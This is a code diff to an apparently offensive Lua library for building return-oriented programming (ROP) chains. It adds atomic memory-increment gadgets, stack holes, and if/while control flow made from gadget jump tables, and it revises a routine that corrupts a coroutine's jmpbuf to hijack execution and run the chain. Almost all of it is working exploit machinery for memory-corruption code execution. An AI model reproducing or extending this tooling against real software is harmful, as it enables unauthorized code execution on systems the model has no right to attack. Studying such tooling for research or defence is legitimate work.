@@ -102,7 +102,9 @@ function ropchain:__tostring()
         if value_symbol[val] then
             val = val .. string.format("\t; %s", value_symbol[val])
         end
-        table.insert(result, string.format("%s: %s", hex(self.stack_base + offset), val))
+        table.insert(result, string.format(
+            "%s: %s", hex(self.stack_base + self.align_offset + offset), val
+        ))
         idx = idx + 1
     end
 
@@ -315,6 +317,21 @@ function ropchain:push_add_dword_memory(addr, num)
     end
 end
 
+function ropchain:push_add_atomic_qword(addr, val)
+    self:push_set_rdx(0) -- some receive a 3rd argument and have a switch case
+    self:push_set_rsi(val)
+    self:push_set_rdi(addr)
+    self:push(libc_addrofs.Atomic_fetch_add_8)
+end
+
+function ropchain:push_increment_atomic_qword(addr)
+    self:push_add_atomic_qword(addr, 1)
+end
+
+function ropchain:push_decrement_atomic_qword(addr)
+    self:push_add_atomic_qword(addr, -1)
+end
+
 function ropchain:push_write_dword_memory(addr, v)
     self:push_set_rax(v)
     self:push_store_eax_into_memory(addr)
@@ -349,6 +366,11 @@ function ropchain:push_set_reg_from_memory(reg, addr)
     self:push_set_reg_from_rax(reg)
 end
 
+function ropchain:create_hole(hole_size)
+    self:push_set_rsp(self:get_rsp() + 0x10 + hole_size)
+    self.stack_offset = self.stack_offset + hole_size
+end
+
 function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
     if rdi then self:push_set_rdi(rdi) end
     if rsi then self:push_set_rsi(rsi) end
@@ -369,11 +391,12 @@ function ropchain:push_syscall_raw(syscall, prep_arg_callback)
             prep_arg_callback()
         end
         self:push_set_rax(syscall.syscall_no)
+        self:create_hole(0x10)
     end
 
     push_size = self:mock_push(push_cb)
     push_cb()
-    
+
     self:push(0) -- will be overwritten
 end
 
@@ -435,12 +458,8 @@ function ropchain:push_store_retval()
     self:push_store_rax_into_memory(buf)
 end
 
-function ropchain:get_retval()
-    local retval = {}
-    for i,v in ipairs(self.retval_addr) do
-        table.insert(retval, memory.read_qword(v))
-    end
-    return retval
+function ropchain:get_last_retval_addr()
+    return self.retval_addr[#self.retval_addr]
 end
 
 function ropchain:dispatch_jumptable_with_rax_index(jump_table)
@@ -456,8 +475,6 @@ end
 
 -- only unsigned 32-bit comparison is supported
 function ropchain:create_branch(value_address, op, compare_value)
-
-    local jump_table = memory.alloc(0x10)
 
     self:push_set_rax(value_address)
     self:push_set_rbx(compare_value)
@@ -477,41 +494,64 @@ function ropchain:create_branch(value_address, op, compare_value)
         errorf("ropchain:create_branch: invalid op (%s)", op)
     end
 
+    local jump_table = memory.alloc(0x10)
     self:dispatch_jumptable_with_rax_index(jump_table)
-
     return jump_table
 end
 
-function ropchain:gen_loop(value_address, op, compare_value, callback)
+-- gen "if statement" style code 
+function ropchain:gen_conditional(value_address, op, compare_value, callback)
 
-    -- {
-    local target_loop = self:get_rsp()
-    callback()
-    -- } while (memory[value_address] <op> compare_value])
     local jump_table = self:create_branch(value_address, op, compare_value)
+    
+    -- if memory[value_address] <op> compare_value then
+        local jmp_cond_true = self:get_rsp()
+        callback()
+    -- end
+
+    local jmp_cond_false = self:get_rsp()
 
     memory.write_multiple_qwords(jump_table, {
-        self:get_rsp(), -- comparison false
-        target_loop, -- comparison true
+        jmp_cond_false, -- comparison false
+        jmp_cond_true, -- comparison true
+    })
+end
+
+-- gen "while statement" style loop
+function ropchain:gen_loop(value_address, op, compare_value, callback)
+
+    local loopback = self:get_rsp()
+    local jump_table = self:create_branch(value_address, op, compare_value)
+    
+    -- while memory[value_address] <op> compare_value do
+        local jmp_cond_true = self:get_rsp()
+        callback()
+        self:push_set_rsp(loopback)
+    -- end
+   
+    local jmp_cond_false = self:get_rsp()
+
+    memory.write_multiple_qwords(jump_table, {
+        jmp_cond_false, -- comparison false
+        jmp_cond_true, -- comparison true
     })
 end
 
 function ropchain:restore_through_longjmp(jmpbuf)
-    
-    if self.finalized then
-        return
+    if not self.finalized then
+        -- restore execution through longjmp
+        self.jmpbuf = jmpbuf or memory.alloc(0x60)
+        self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)
+        self.finalized = true
     end
-
-    self.jmpbuf = jmpbuf or memory.alloc(0x60)
-
-    -- restore execution through longjmp
-    self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)
-
-    self.finalized = true
 end
 
 -- corrupt coroutine's jmpbuf for code execution
 function ropchain:execute_through_coroutine()
+
+    if not self.finalized then
+        error("restore_through_longjmp need to be run first")
+    end
 
     local run_hax = function(lua_state_addr)
 
@@ -529,9 +569,11 @@ function ropchain:execute_through_coroutine()
     -- run ropchain
     local victim = coroutine.create(run_hax)
     coroutine.resume(victim, lua.addrof(victim))
-    
-    -- get return value(s)
-    return unpack(self:get_retval())
+
+    local retval = self:get_last_retval_addr()
+    if retval then
+        return memory.read_qword(retval)
+    end
 end
 
 --
